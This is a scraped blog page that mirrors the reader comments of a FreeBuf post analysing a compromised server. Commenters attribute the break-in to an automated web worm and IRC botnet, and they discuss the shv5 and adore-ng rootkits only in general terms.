<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""> <a href="&quot;累计分享3次&quot;">3</a>
<img src="&quot;Favorite&quot;" alt="Favorite"><img src="&quot;Loading&quot;" alt="Loading"><a href="http://www.freebuf.com/articles/system/?wpfpaction=add&amp;postid=12443" title="收藏该文" target="_blank">收藏该文</a></p>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12696.html" target="_blank">Dionaea低交互式蜜罐部署详解</a></li>
</ul>
<p><strong>4</strong>条评论 <strong>3638</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12443.html" target="_blank">一次服务器被入侵后的分析</a></li>
</ul>
<p><strong>24</strong>条评论 <strong>9904</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank">Socks代理反弹突破内网</a></li>
</ul>
<p><strong>15</strong>条评论 <strong>6114</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12140.html" target="_blank">如何导出Windows哈希系列二</a></li>
</ul>
<p><strong>7</strong>条评论 <strong>3940</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/system/12104.html" target="_blank">浅谈企业运维安全</a></li>
</ul>
<p><strong>21</strong>条评论 <strong>6140</strong>人已围观
﻿</p>
<h2 id="24-comments-">24 Comments <a href="">发表评论</a></h2>
<ol>
<li><a href="http://www.freebuf.com/?author=3022" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/园长MM" target="_blank">园长MM </a> (1级)  <a href=""></a> 2013-09-11    1楼</li>
</ol>
<p>路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15570#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=1804" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/whitemonty" target="_blank">whitemonty </a> (1级)  <a href=""></a> 2013-09-11    2楼</li>
</ol>
<p>欢迎收看黑客追踪第一季
<a href="">亮了</a>(5)
<a href="http://www.freebuf.com/articles/system/?replytocom=15572#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11    3楼</li>
</ol>
<p>一个普通的web蠕虫+IRC木马 而已。
据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。</p>
<p>文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
<a href="">亮了</a>(10)
<a href="http://www.freebuf.com/articles/system/?replytocom=15575#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 虽然没看懂。但是感觉很高端的样子
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15576#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@litdg  <img src="http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg" alt="">
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15578#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 baidu又搞防外链…
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15580#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15590#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> Helen <a href=""></a> 2013-09-11    4楼</li>
</ul>
<p>我国外的小弟做的
<a href="">亮了</a>(7)
<a href="http://www.freebuf.com/articles/system/?replytocom=15577#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=524" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/softbug" target="_blank">softbug </a> (4级) 用软件解放大家的双手，希望大家都可以使用自己开发的软件。 <a href=""></a> 2013-09-11    5楼</li>
</ul>
<p>好久没看到过入侵分析的文章了。而且是真实案例
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15581#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11    6楼</li>
</ul>
<p>比较弱智的小骇客的行为，对比足迹也没做任何处理，说明是自动化完成的。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15586#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/articles/system/?replytocom=15587#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx
嗯，是自动化行为，所以隐藏的比较粗糙，刚去分析了下这个shv5的rootkit，这个rootkit本身做的也比较粗糙，是基于替换文件的方式来完成的，并且也没做端口隐藏，通过strace一览无余。。
推荐有兴趣的朋友可以去分析下adore-ng这个rootkit，这个rootkit做的比较精致，知其然知其所以然，可好好了解下设计原理，更容易从设计角度来分析。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15601#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  恩。我也是分析shv5的时候发现的这文章。感谢回复。希望可以多多交流。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15614#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11    7楼</li>
</ul>
<p>2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
<a href="">亮了</a>(18)
<a href="http://www.freebuf.com/articles/system/?replytocom=15588#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 我也来亮一个
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15593#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 暴龙哥 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 虽然是几年前的文章，但是的确是个好东西。
也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/articles/system/?replytocom=15597#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@暴龙哥 你懂我！！！感谢
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15602#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=2918" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Draycen" target="_blank">Draycen </a> (1级)  <a href=""></a> 2013-09-11    8楼</li>
</ul>
<p><img src="" alt=":cool:"> 路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15592#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> helen <a href=""></a> 2013-09-11    9楼</li>
</ul>
<p>Holiday cracking Monday, 09 April 2007
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15598#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4398" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/逝情" target="_blank">逝情 </a> (1级) 弱爆了，求带~ <a href=""></a> 2013-09-11    10楼</li>
</ul>
<p>似乎，很高端的样子。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15600#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1070" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/p0tt1" target="_blank">p0tt1 </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FB达人"> (4级) 论之语网络安全工程师，Sniffer组员，NTsafe站长 <a href=""></a> 2013-09-11    11楼</li>
</ul>
<p>其实老外也有批量抓鸡的~但是按照楼主描述的安全配置的强度 不像能被抓到的~
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15604#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxoo <a href=""></a> 2013-09-12    12楼</li>
</ul>
<p>jboss /tomcat 等都有蠕虫吧<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="code"><pre>[<span class="link_label">亮了</span>](<span class="link_url"></span>)(1)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15623#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4790</span>) [<span class="link_label">Leo-o </span>](<span class="link_url">http://www.freebuf.com/author/Leo-o</span>) (1级)  []() 2013-09-12    13楼

Mark , 涨姿势了。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15676#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4025</span>) [<span class="link_label">心在想念 </span>](<span class="link_url">http://www.freebuf.com/author/心在想念</span>) (1级) 道，可道，非常道！名，可名，非常名！ []() 2013-09-13    14楼

高端。。。。。。。。。。。。。。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15679#respond</span>)
昵称
(必须)您当前尚未登录。[<span class="link_label">登陆</span>](<span class="link_url">http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Ffreebuf.com%2Farticles%2Fsystem%2F12443.html "登陆"</span>)？注册

邮箱
必须(保密)

发表言论前，请滑动滚动条解锁
[<span class="link_label">表情</span>](<span class="link_url"></span>)[<span class="link_label">插代码</span>](<span class="link_url"></span>)[<span class="link_label">插图</span>](<span class="link_url"></span>)

[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mrgreen"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "razz"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "sad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "smile"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "oops"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "grin"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "eek"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "???"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cool"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "lol"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "twisted"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "roll"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "wink"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "idea"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "arrow"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "neutral"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cry"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "?"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "evil"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "shock"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "!"</span>)
正在提交, 请稍候...

/#

[取消]()   有人回复时邮件通知我

<span class="header">### **本文这些评论亮了![]()[捐助我们](http://www.freebuf.com/donate)****Hot Comments**</span>

[xxx]() @ 2013-09-11 13:12:28

2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (18) [xt9]() @ 2013-09-11 11:01:53

一个普通的web蠕虫+IRC木马 而已。 据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。 文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (10) [Helen]() @ 2013-09-11 11:17:36

我国外的小弟做的
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (7) [xt9]() @ 2013-09-11 11:26:42

@litdg  ![](http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg)
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [litdg]() @ 2013-09-11 13:36:34

@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [whitemonty]() @ 2013-09-11 10:33:01

欢迎收看黑客追踪第一季
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (5) [xxx]() @ 2013-09-11 13:09:31

@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (2) [暴龙哥]() @ 2013-09-11 14:43:13

@xxx 虽然是几年前的文章，但是的确是个好东西。 也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (1) [xxoo]() @ 2013-09-12 10:25:42

jboss /tomcat 等都有蠕虫吧
</pre></td></tr></table></figure></p>
<p><a href="">亮了</a> (1)</p>
<h3 id="-new-posts-"><strong>最新发布**</strong>New Posts**</h3>
<ul>
<li><a href="http://www.freebuf.com/tools/13103.html" title="知名安全扫描工具AWVS 9（破解版下载）" target="_blank">知名安全扫描工具AWVS 9（破解版下载）</a></li>
<li><a href="http://www.freebuf.com/news/13031.html" title="喜剧：巴西黑客欲攻击NSA，结果NASA躺枪" target="_blank">喜剧：巴西黑客欲攻击NSA，结果NASA躺枪</a></li>
<li><a href="http://www.freebuf.com/news/13094.html" title="FireEye：中国黑客攻击美国无人机制造商" target="_blank">FireEye：中国黑客攻击美国无人机制造商</a></li>
<li><a href="http://www.freebuf.com/news/13081.html" title="解放区？上海自贸区将不设防火长城" target="_blank">解放区？上海自贸区将不设防火长城</a></li>
<li><a href="http://www.freebuf.com/tools/13073.html" title="DNS隧道制造工具——iodine" target="_blank">DNS隧道制造工具——iodine</a></li>
<li><a href="http://www.freebuf.com/tools/13063.html" title="网站指纹识别工具——WhatWeb v0.4.7发布" target="_blank">网站指纹识别工具——WhatWeb v0.4.7发布</a></li>
<li><a href="http://www.freebuf.com/news/13047.html" title="每月偷窃$50000美金的19岁阿根廷黑客被捕" target="_blank">每月偷窃$50000美金的19岁阿根廷黑客被捕</a></li>
<li><a href="http://www.freebuf.com/news/13010.html" title="国外发现勒索软件借助NSA棱镜事件行骗" target="_blank">国外发现勒索软件借助NSA棱镜事件行骗</a></li>
<li><a href="http://www.freebuf.com/news/12989.html" title="世界最大的数据库泄露统计" target="_blank">世界最大的数据库泄露统计</a></li>
<li><a href="http://www.freebuf.com/video/12984.html" title="十字路口的守望者：17岁白帽黑客的成长之路（视频）" target="_blank">十字路口的守望者：17岁白帽黑客的成长之路（视频）</a>
<img src="" alt=""> 微信扫描上图订阅freebuf，每日精华文章推送。
All of the material and the informations available on freebuf. com is for informative purpose. freebuf.com declines all responsibilities from the damage that may be done of it, consequently it does not encourage who might use it for illegal purposes.</li>
</ul>
<h3 id="freebuf-com">FREEBUF.COM</h3>
<p><a href="http://www.freebuf.com/dis" target="_blank">免责声明</a> <a href="http://www.freebuf.com/friends" target="_blank">友情链接</a> <a href="http://www.freebuf.com/newsend" target="_blank">我要投稿</a>
<a href="http://www.freebuf.com/others/864.html" target="_blank">关于我们</a> <a href="http://www.freebuf.com/partner" target="_blank">合作伙伴</a> <a href="http://www.freebuf.com/contact" target="_blank">联系我们</a></p>
<p>Copyright @ 2012 WWW.FREEBUF.COM All Rights Reserved <a href="http://www.miibeian.gov.cn/" target="_blank">沪ICP备13033796号-1</a>
<a href=""></a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--一次服务器被入侵后的分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/90/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/88/">88</a></li><li><a class="page-number" href="/page/89/">89</a></li><li><a class="page-number" href="/page/90/">90</a></li><li class="active"><li><span class="page-number current">91</span></li><li><a class="page-number" href="/page/92/">92</a></li><li><a class="page-number" href="/page/93/">93</a></li><li><a class="page-number" href="/page/94/">94</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/92/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-25 18:15:42</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
